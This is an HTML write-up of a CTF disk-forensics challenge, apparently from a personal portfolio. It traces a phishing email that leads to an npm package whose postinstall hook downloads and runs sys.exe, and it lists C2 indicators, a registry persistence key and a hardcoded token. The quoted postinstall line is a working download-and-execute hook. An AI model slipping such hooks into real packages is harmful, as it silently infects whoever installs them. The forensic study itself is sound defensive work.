@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Silent Visitor - Securinets CTF 2025</title>
+    <link rel="stylesheet" href="assets/style.css">
+</head>
+<body>
+    <nav class="navbar">
+        <div class="nav-container">
+            <a href="index.html" class="nav-brand">← Back to Overview</a>
+            <div class="nav-links">
+                <a href="#scenario">Scenario</a>
+                <a href="#investigation">Investigation</a>
+                <a href="#timeline">Timeline</a>
+            </div>
+        </div>
+    </nav>
+
+    <header class="hero">
+        <div class="hero-overlay"></div>
+        <img src="assets/images/silent-visitor/registry-analysis.jpg.png" alt="Silent Visitor Challenge">
+        <div class="hero-content">
+            <h1>Silent Visitor</h1>
+            <p class="hero-subtitle">Windows Disk Forensics & Malware Analysis</p>
+            <div class="hero-meta">
+                <span class="badge">Challenge 1</span>
+                <span class="badge">Disk Forensics</span>
+                <span class="badge">15 Questions</span>
+            </div>
+        </div>
+    </header>
+
+    <main class="container">
+        <section id="scenario" class="section">
+            <h2 class="section-title">Scenario</h2>
+            <div class="content-card">
+                <p>A user reported suspicious activity on their Windows workstation. As a forensic investigator, you've been provided with a disk image and tasked with uncovering the full attack chain by answering a series of questions.</p>
+                
+                <div class="warning">
+                    <strong>Challenge Objective:</strong> Investigate the disk image, identify the malware, trace the attack vector, and document the persistence mechanisms used by the attacker.
+                </div>
+            </div>
+        </section>
+
+        <section id="investigation" class="section">
+            <h2 class="section-title">Investigation Process</h2>
+
+            <div class="step-container">
+                <!-- Step 1: Initial Triage -->
+                <div class="step">
+                    <h3>Initial Triage & System Information</h3>
+                    <p>The first step in any forensic investigation is to establish the integrity of the evidence and gather basic system information.</p>
+                    
+                    <h4>Q1: Disk Image Hash</h4>
+                    <div class="command-box">
+                        <div class="command">sha256sum disk.img</div>
+                        <div class="output">122B2B4BF1433341BA6E8FEFD707379A98E6E9CA376340379EA42EDB31A5DBA2</div>
+                    </div>
+                    
+                    <h4>Q2: OS Build Number</h4>
+                    <p>Located in the SOFTWARE registry hive:</p>
+                    <div class="finding">
+                        <strong>Registry Path:</strong> <code>SOFTWARE\Microsoft\Windows NT\CurrentVersion</code><br>
+                        <strong>Build Number:</strong> 19045
+                    </div>
+                    <img src="assets/images/silent-visitor/registry-analysis.jpg.png" alt="Registry analysis showing OS build">
+                    
+                    <h4>Q3: Victim's IP Address</h4>
+                    <div class="finding">
+                        <strong>Registry Path:</strong> <code>SYSTEM\ControlSet001\Services\Tcpip\Parameters\Interfaces</code><br>
+                        <strong>IP Address:</strong> 192.168.206.131
+                    </div>
+                </div>
+
+                <!-- Step 2: Application Analysis -->
+                <div class="step">
+                    <h3>Email Application & User Analysis</h3>
+                    
+                    <h4>Q4: Email Application</h4>
+                    <p>Examined the <code>AppData</code> folder to identify installed applications:</p>
+                    <div class="finding">
+                        <strong>Application:</strong> Thunderbird<br>
+                        <strong>Location:</strong> <code>C:\Users\ammar\AppData\Roaming\Thunderbird</code>
+                    </div>
+                    
+                    <div class="warning">
+                        <strong>⚠️ Suspicious Finding:</strong> A file named <code>sys.exe</code> was discovered in the AppData directory. This is highly unusual as legitimate system executables should be in System32, not in user directories.
+                    </div>
+                    
+                    <h4>Q5: Victim's Email Address</h4>
+                    <p>Navigated to Thunderbird profile: <code>Profiles/6red5uxz.default-release/ImapMail</code></p>
+                    <img src="assets/images/silent-visitor/thunderbird-inbox.png" alt="Thunderbird inbox analysis">
+                    <div class="finding">
+                        <strong>Email:</strong> ammar55221133@gmail.com
+                    </div>
+                </div>
+
+                <!-- Step 3: Attack Vector -->
+                <div class="step">
+                    <h3>Identifying the Attack Vector</h3>
+                    
+                    <h4>Q6: Attacker's Email</h4>
+                    <p>Analyzed the INBOX file and found suspicious emails from Mohamed Masmoudi containing a GitHub repository link.</p>
+                    <div class="finding">
+                        <strong>Attacker Email:</strong> masmoudim522@gmail.com<br>
+                        <strong>Attack Method:</strong> Phishing email with malicious GitHub repo
+                    </div>
+                    
+                    <h4>Q7: Malware Delivery URL</h4>
+                    <p>Examined the GitHub repository's <code>package.json</code> file:</p>
+                    <img src="assets/images/silent-visitor/github" alt="Malicious package.json">
+                    
+                    <div class="command-box">
+                        <div class="command">cat package.json</div>
+                        <div class="output">{
+  "scripts": {
+    "postinstall": "powershell -c wget https://tmpfiles.org/dl/23860773/sys.exe -O $env:APPDATA\\sys.exe; Start-Process $env:APPDATA\\sys.exe"
+  }
+}</div>
+                    </div>
+                    
+                    <div class="finding">
+                        <strong>Delivery URL:</strong> <code>https://tmpfiles.org/dl/23860773/sys.exe</code>
+                    </div>
+                    
+                    <p>This npm package automatically downloads and executes the malware upon installation!</p>
+                </div>
+
+                <!-- Step 4: Malware Analysis -->
+                <div class="step">
+                    <h3>Malware Characterization</h3>
+                    
+                    <h4>Q8: Malware Hash</h4>
+                    <div class="hash-display">
+                        SHA256: BE4F01B3D537B17C5BA7DC1BB7CD4078251364398565A0CA1E96982CFF820B6D
+                    </div>
+                    
+                    <p>Uploaded to VirusTotal for analysis:</p>
+                    <img src="assets/images/silent-visitor/virustotal-analysis.png" alt="VirusTotal malware analysis">
+                    
+                    <div class="warning">
+                        <strong>Key Insight:</strong> The malware is written in Go, which makes static analysis more challenging due to Go's runtime and compilation characteristics. Dynamic analysis becomes essential.
+                    </div>
+                </div>
+
+                <!-- Step 5: C2 Analysis -->
+                <div class="step">
+                    <h3>Command & Control Infrastructure</h3>
+                    
+                    <h4>Q9-10: C2 Server Information</h4>
+                    <p>Using VirusTotal's behavioral analysis and network indicators:</p>
+                    <div class="finding">
+                        <strong>C2 Server IP:</strong> 40.113.161.85<br>
+                        <strong>C2 Port:</strong> 5000
+                    </div>
+                    
+                    <h4>Q11: Initial Beacon</h4>
+                    <p>Analyzed the malware using any.run sandbox:</p>
+                    <img src="assets/images/silent-visitor/anyrun-c2.jpg.png" alt="any.run C2 communication">
+                    
+                    <div class="command-box">
+                        <div class="output">First Request:
+http://40.113.161.85:5000/helppppiscofebabe23</div>
+                    </div>
+                </div>
+
+                <!-- Step 6: Persistence Mechanism -->
+                <div class="step">
+                    <h3>Persistence Analysis</h3>
+                    
+                    <h4>Q12: System Fingerprinting</h4>
+                    <p>The malware creates a unique identifier file:</p>
+                    <div class="finding">
+                        <strong>File Path:</strong> <code>C:\Users\Public\Documents\id.txt</code><br>
+                        <strong>Content:</strong> <code>3649ba90-266f-48e1-960c-b908e1f28aef</code>
+                    </div>
+                    <p>This UUID likely serves as a bot identifier for the C2 server to track infected machines.</p>
+                    
+                    <h4>Q13-14: Registry Persistence</h4>
+                    <p>Exported and analyzed the <code>NTUSER.DAT</code> hive:</p>
+                    <img src="assets/images/silent-visitor/persistence-registry.jpg.png" alt="Registry persistence mechanism">
+                    
+                    <div class="finding">
+                        <strong>Registry Key:</strong> <code>HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\MyApp</code><br>
+                        <strong>Value:</strong> <code>C:\Users\ammar\Documents\sys.exe</code>
+                    </div>
+                    
+                    <p>This ensures the malware automatically executes every time the user logs in.</p>
+                    
+                    <h4>Q15: Authentication Token</h4>
+                    <p>Extracted hardcoded secrets using strings analysis:</p>
+                    <div class="command-box">
+                        <div class="command">strings sys.exe | grep -i "secret"</div>
+                        <div class="output">build -ldflags="-s -w -X main.secret=e7bcc0ba5fb1dc9cc09460baaa2a6986 -X main.ipC2=qukttvktstk}p -H windowsgui"</div>
+                    </div>
+                    
+                    <div class="finding">
+                        <strong>Secret Token:</strong> <code>e7bcc0ba5fb1dc9cc09460baaa2a6986</code>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section id="timeline" class="section">
+            <h2 class="section-title">Attack Timeline</h2>
+            <div class="content-card">
+                <div class="attack-timeline">
+                    <div class="timeline-item">
+                        <h4>1. Initial Compromise</h4>
+                        <p>Attacker (masmoudim522@gmail.com) sends phishing email to victim (ammar55221133@gmail.com) with link to malicious GitHub repository.</p>
+                    </div>
+                    <div class="timeline-item">
+                        <h4>2. Malware Delivery</h4>
+                        <p>Victim installs npm package, triggering postinstall script that downloads sys.exe from tmpfiles.org.</p>
+                    </div>
+                    <div class="timeline-item">
+                        <h4>3. Initial Execution</h4>
+                        <p>Malware executes from AppData directory and creates unique identifier (3649ba90-266f-48e1-960c-b908e1f28aef) in id.txt.</p>
+                    </div>
+                    <div class="timeline-item">
+                        <h4>4. Persistence Establishment</h4>
+                        <p>Malware creates registry Run key for automatic execution on user login.</p>
+                    </div>
+                    <div class="timeline-item">
+                        <h4>5. C2 Communication</h4>
+                        <p>Establishes connection with C2 server (40.113.161.85:5000) using hardcoded authentication token.</p>
+                    </div>
+                    <div class="timeline-item">
+                        <h4>6. Ongoing Activity</h4>
+                        <p>Malware remains persistent, maintaining C2 communication for command execution and data exfiltration.</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section class="section">
+            <h2 class="section-title">Key Findings Summary</h2>
+            <div class="stats-grid">
+                <div class="stat-card">
+                    <h3>5</h3>
+                    <p>Attack Stages Identified</p>
+                </div>
+                <div class="stat-card">
+                    <h3>3</h3>
+                    <p>Persistence Mechanisms</p>
+                </div>
+                <div class="stat-card">
+                    <h3>1</h3>
+                    <p>C2 Server Discovered</p>
+                </div>
+                <div class="stat-card">
+                    <h3>Go</h3>
+                    <p>Malware Language</p>
+                </div>
+            </div>
+        </section>
+
+        <section class="section">
+            <h2 class="section-title">Tools & Techniques</h2>
+            <div class="tools-grid">
+                <div class="tool-category">
+                    <h3>Disk Forensics</h3>
+                    <ul>
+                        <li>FTK Imager</li>
+                        <li>Registry Explorer</li>
+                        <li>RegRipper</li>
+                    </ul>
+                </div>
+                <div class="tool-category">
+                    <h3>Malware Analysis</h3>
+                    <ul>
+                        <li>VirusTotal</li>
+                        <li>any.run Sandbox</li>
+                        <li>strings utility</li>
+                    </ul>
+                </div>
+                <div class="tool-category">
+                    <h3>Email Forensics</h3>
+                    <ul>
+                        <li>Thunderbird Profile Analysis</li>
+                        <li>MBOX File Parsing</li>
+                    </ul>
+                </div>
+            </div>
+        </section>
+
+        <section class="section cta-section">
+            <h2>Continue to Next Challenge</h2>
+            <p>Check out the Lost File challenge where we perform memory forensics and cryptographic analysis.</p>
+            <div class="cta-buttons">
+                <a href="lost-file.html" class="btn-primary">Lost File Writeup →</a>
+                <a href="index.html" class="btn-secondary">Back to Overview</a>
+            </div>
+        </section>
+    </main>
+
+    <footer class="footer">
+        <div class="footer-content">
+            <p>&copy; 2025 Aziz Haddadi | Cybersecurity Portfolio</p>
+            <div class="footer-links">
+                <a href="https://www.linkedin.com/in/aziz-haddadi-825209288" target="_blank">LinkedIn</a>
+                <a href="https://github.com/aziz-haddadi" target="_blank">GitHub</a>
+            </div>
+        </div>
+    </footer>
+
+    <button class="scroll-top" onclick="window.scrollTo({top: 0, behavior: 'smooth'})">↑</button>
+
+    <script>
+        // Show scroll to top button
+        window.addEventListener('scroll', () => {
+            const scrollBtn = document.querySelector('.scroll-top');
+            if (window.pageYOffset > 300) {
+                scrollBtn.classList.add('visible');
+            } else {
+                scrollBtn.classList.remove('visible');
+            }
+        });
+    </script>
+</body>
+</html>
